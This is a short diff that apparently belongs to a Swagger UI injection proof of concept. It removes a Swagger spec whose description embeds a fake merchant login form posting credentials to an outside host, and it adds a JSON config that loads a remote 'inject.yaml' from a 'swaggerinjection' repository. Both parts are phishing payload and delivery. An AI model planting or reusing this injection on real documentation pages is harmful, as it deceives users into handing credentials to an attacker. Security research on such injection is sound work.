@@ -1,31 +1,9 @@
-swagger: '2.0'
-info:
-  version: 1.0.0
-  title: Fake Login Page
-  description: '<div class="login-form">
-    <div class="heading">
-        <h1>Merchant Simple phishig page</h1>
-      <h2>Login to see the complete documentation</h2>
-    </div>
-    <div class="form-container">
-        <form action="https://soufiane.website/login" method="post" class="form-signin">
-            <div class="form-group">
-                <label for="username">Merchant ID</label>
-                <input type="text" name="username" size="20">
-            </div>
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" name="password" size="20">
-            </div>
-            <div class="form-group">
-                <button type="submit" class="btn btn-default">Login</button>
-            </div>
-        </form>
-    </div>
-</div>'
-paths:
-  /:
-    post:
-      responses:
-        '200':
-          description: Login successful
+{
+    "url": "https://raw.githubusercontent.com/soufianetahiri/swaggerinjection/refs/heads/main/inject.yaml",
+    "urls": [
+        {
+            "url": "https://raw.githubusercontent.com/soufianetahiri/swaggerinjection/refs/heads/main/inject.yaml",
+            "name": "Test"
+        }
+    ]
+}
